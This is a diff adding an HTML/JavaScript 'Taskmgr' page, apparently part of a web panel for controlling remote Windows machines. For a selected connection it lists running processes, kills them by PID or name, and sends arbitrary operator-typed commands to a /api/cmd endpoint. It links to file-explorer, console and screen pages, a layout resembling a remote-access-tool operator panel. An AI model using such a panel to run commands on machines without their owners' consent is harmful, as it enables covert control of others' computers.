@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<title>Connections</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="https://i.imgur.com/CsVKESW.jpg">
+	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+	<style type="text/css">
+		@import url("https://fonts.googleapis.com/css?family=Roboto+Mono");
+
+		table {
+			width: 100%;
+			border-collapse: collapse;
+		}
+
+		th,
+		td {
+			border: 1px solid darkorange;
+			padding: 4px;
+			text-align: center;
+		}
+
+		th {
+			background-color: orange;
+			font-weight: bold;
+		}
+
+		tr:nth-child(even) {
+			background-color: #f2f2f2;
+		}
+
+		tr:nth-child(odd) {
+			background-color: #FFF;
+		}
+
+		tr:hover {
+			background-color: lightgray;
+			cursor: pointer;
+		}
+
+		header-table {
+			position: absolute;
+		}
+
+		.headbtn {
+			padding: 10px 20px;
+			background-color: #007bff;
+			color: #fff;
+			text-decoration: none;
+			border-radius: 5px;
+			margin-left: 4px;
+		}
+
+		.headbtn:hover {
+			background-color: green;
+		}
+
+		.logo {
+			max-width: 100px;
+		}
+
+		body {
+			font-family: "Roboto", sans-serif;
+			background-color: #f7f7f7;
+			padding: 20px;
+		}
+
+		.title {
+			text-align: center;
+			flex-grow: 1;
+		}
+
+		.header {
+			display: flex;
+			justify-content: space-between;
+			align-items: center;
+			padding: 20px;
+		}
+
+		#console {
+			max-height: 400px;
+			height: 400px;
+			overflow: auto;
+			background-color: black;
+			color: white;
+			font-family: monospace;
+			padding: 10px;
+		}
+
+		#commandInput {
+			padding: 10px;
+			font-size: 16px;
+			border: 1px solid #333;
+			border-radius: 5px;
+			width: 89%;
+			margin-right: 10px;
+			float: left;
+		}
+
+		#commandInput::placeholder {
+			color: #999;
+		}
+
+		#execbtn {
+			float: right;
+			padding: 10px 15px;
+			font-size: 16px;
+			background-color: #007bff;
+			color: white;
+			border: none;
+			border-radius: 5px;
+			cursor: pointer;
+		}
+
+		#execbtn:hover {
+			background-color: #0056b3;
+		}
+	</style>
+</head>
+
+<body>
+	<div class="header">
+		<img src="https://i.imgur.com/CsVKESW.jpg" alt="Lgo" class="logo">
+		<h1 class="title">Taskmgr</h1>
+		<a href="connections?" class="headbtn">Connections</a>
+		<a href="explorer?" class="headbtn">Explorer</a>
+		<a href="console?" class="headbtn">Console</a>
+		<a href="screen?" class="headbtn">Screen</a>
+		<a href="license?" class="headbtn">License</a>
+	</div>
+	<br>
+	<div class="checkbox-wrapper">
+		<input type="checkbox" id="mode" onchange="handleChange()">
+		<label for="mode">Full info</label><br>
+		<input type="checkbox" id="freeze" onchange="handleChange()">
+		<label for="freeze">Freeze</label><br>
+	</div>
+	<br>
+	<div>
+		<input type="text" id="commandInput" placeholder="Enter command...">
+		<button id="execbtn">Execute</button>
+		<br>
+		<br>
+		<br>
+	</div>
+	<table>
+		<div id="table-container">
+			<div>
+	</table>
+	<div>
+		<h4>Processes: <span id="total_connected">0</span></h4>
+		<p>Selected socket: <span id="selected_socket">null</span></p>
+		<p>Selected item: <span id="selected_item">null</span></p>
+	</div>
+</body>
+<script>
+	const url = window.location.href;
+	const socket = url.split("?socket=")[1];
+	let selected = "";
+	console.log("Current socket: " + socket);
+	let checkboxValues = {
+		mode: false,
+		freeze: false
+	};
+	if (socket.toLowerCase().includes("windows")) {
+		setInterval(updateTable, 2000);
+	} else {
+		alert("Unsupported os!");
+		window.history.back();
+	}
+	setInterval(() => {
+		updateLinks(socket);
+	}, 10);
+	document.getElementById("execbtn").addEventListener("click", function () {
+		var cmd = document.getElementById("commandInput").value;
+		let url = "/api/cmd?socket=" + socket + "&command=" + cmd;
+		fetch(url)
+			.then(response => response.json())
+			.then((data) => {
+				Swal.fire("Command sent. Answer:" + JSON.stringify(data), "", "success");
+			})
+			.catch(error => {
+				Swal.fire("Error: " + error.toString(), "", "error");
+			});
+	});
+	document
+		.getElementById("table-container")
+		.addEventListener("click", function (event) {
+			if (event.target.tagName === "TD") {
+				let selectedRow = event.target.parentNode;
+				let rowData = Array.from(selectedRow.children).map(
+					(cell) => cell.textContent
+				);
+				console.log("Selected: ", rowData);
+				let selectedsocket = document.getElementById("selected_item");
+				selectedsocket.textContent = rowData;
+				selected = rowData;
+				Swal.fire({
+					title: "Select action to do",
+					showDenyButton: true,
+					showCancelButton: true,
+					confirmButtonText: "Kill by PID",
+					denyButtonText: `Kill by Name`
+				}).then((result) => {
+					if (result.isConfirmed) {
+						let url = "/api/killproc_pid?socket=" + socket + "&kill=" + selected;
+						fetch(url)
+							.then(response => response.json())
+							.then((data) => {
+								Swal.fire("Killed process by PID: " + selected, "", "success");
+							})
+							.catch(error => {
+								Swal.fire("Error: " + error.toString(), "", "error");
+							});
+					} else if (result.isDenied) {
+						let url = "/api/killproc_name?socket=" + socket + "&kill=" + selected;
+						fetch(url)
+							.then(response => response.json())
+							.then((data) => {
+								Swal.fire("Killed process by NAME: " + selected, "", "success");
+							})
+							.catch(error => {
+								Swal.fire("Error: " + error.toString(), "", "error");
+							});
+					}
+				});
+			}
+		});
+
+
+	function updateLinks(socket1) {
+		let linkElements = document.querySelectorAll(".headbtn");
+		linkElements.forEach((linkElement) => {
+			let currentHref = linkElement.getAttribute("href");
+			let newUrl = currentHref.split("?")[0];
+			linkElement.setAttribute("href", newUrl + "?socket=" + socket1);
+			let selectedsocket = document.getElementById("selected_socket");
+			selectedsocket.textContent = socket1;
+		});
+	}
+
+	function updateTable() {
+		if (checkboxValues.freeze) {
+			return;
+		}
+		let request = "/api/taskmgrfast?socket=" + socket;
+		if (checkboxValues.mode) {
+			request = "/api/taskmgr?socket=" + socket;
+		}
+		fetch(request)
+			.then(response => response.json())
+			.then(data => {
+				let jsonArray = data;
+				console.log("Received: ", jsonArray);
+
+				let tableContainer = document.getElementById("table-container");
+				while (tableContainer.firstChild) {
+					tableContainer.removeChild(tableContainer.firstChild);
+				}
+				let totalc = document.getElementById("total_connected");
+				totalc.textContent = jsonArray.length;
+				let table = document.createElement("table");
+				let headerRow = table.insertRow();
+
+				let ipCell = document.createElement("th");
+				ipCell.textContent = "PID";
+				headerRow.appendChild(ipCell);
+				let userCell = document.createElement("th");
+				userCell.textContent = "Name";
+				headerRow.appendChild(userCell);
+				let osCell = document.createElement("th");
+				osCell.textContent = "User";
+				headerRow.appendChild(osCell);
+				let countryCell = document.createElement("th");
+				countryCell.textContent = "State";
+				headerRow.appendChild(countryCell);
+				let nativeCell = document.createElement("th");
+				nativeCell.textContent = "Memory";
+				headerRow.appendChild(nativeCell);
+				let robotCell = document.createElement("th");
+				robotCell.textContent = "Session";
+				headerRow.appendChild(robotCell);
+				let robotCell1 = document.createElement("th");
+				robotCell1.textContent = "Title";
+				headerRow.appendChild(robotCell1);
+
+				jsonArray.forEach((item) => {
+					let row = table.insertRow();
+					row.classList.add("data-row");
+					Object.values(item).forEach((value) => {
+						let cell = row.insertCell();
+						cell.textContent = value;
+					});
+				});
+
+				tableContainer.appendChild(table);
+			})
+			.catch(error => {
+				console.error('Error: ', error);
+			});
+	}
+	function handleChange() {
+		checkboxValues.mode = document.getElementById('mode').checked;
+		checkboxValues.freeze = document.getElementById('freeze').checked;
+	}
+
+</script>
+
+</html>
